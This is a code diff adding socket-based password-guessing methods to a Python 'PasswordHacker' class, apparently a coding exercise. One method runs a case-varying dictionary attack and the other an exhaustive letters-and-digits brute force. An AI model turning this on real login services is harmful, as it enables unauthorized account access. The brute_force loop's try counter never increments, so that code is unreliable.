@@ -1,7 +1,11 @@
 import argparse
 import socket
+import string
+import itertools
 
 class PasswordHacker:
+    MAX_TRIES = 1_000_000
+    ACCEPTED_CHARS = string.ascii_letters + string.digits
     n_ph = 0
 
     def __init__(self, ip_address, port):
@@ -22,21 +26,51 @@ class PasswordHacker:
     def __str__(self):
         return self.__repr__()
 
-    def send_msg(self, msg):
+    def dictionary_brute_force(self, dict_path):
+        with socket.socket() as hacking_socket, \
+                open(dict_path, 'r', encoding='utf-8') as dict_file:
+            hacking_socket.connect((self.ip_address, self.port))
+            for password in dict_file:
+                password = password.strip('\n')
+                combinations = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(),
+                    letter.upper()] for letter in password))))
+                for combination in combinations:
+                    enc_password = combination.encode()
+                    hacking_socket.send(enc_password)
+                    if hacking_socket.recv(32768).decode() == 'Connection success!':
+                        return enc_password.decode()
+            return None
+
+    def brute_force(self):
         with socket.socket() as hacking_socket:
             hacking_socket.connect((self.ip_address, self.port))
-            hacking_socket.send(msg.encode())
-            return hacking_socket.recv(32768).decode()
+            tries = 0
+            r = 1
+            iterator = itertools.product(self.ACCEPTED_CHARS, repeat=r)
+            while tries <= 1_000_000:
+                try:
+                    enc_password = ''.join(next(iterator)).encode()
+                    hacking_socket.send(enc_password)
+                    if hacking_socket.recv(32768).decode() == 'Connection success!':
+                        return enc_password.decode()
+                except StopIteration:
+                    r += 1
+                    iterator = itertools.product(self.ACCEPTED_CHARS, repeat=r)
+            return None
 
 def main():
     parser = argparse.ArgumentParser(description='Process IP address, port, message for sending.')
     parser.add_argument('ip_address', metavar='IP', help='IP address for connection.')
     parser.add_argument('port', type=int, help='Port to connect.')
-    parser.add_argument('msg', help='Message for sending.')
     args = parser.parse_args()
 
     password_hacker = PasswordHacker(args.ip_address, args.port)
-    print(password_hacker.send_msg(args.msg))
+    result = password_hacker.dictionary_brute_force('C:\\Users\\matku\\Desktop\\passwords.txt')
+
+    if result == None:
+        print('-> Password not found <-')
+    else:
+        print(result)
 
 if __name__ == '__main__':
     main()
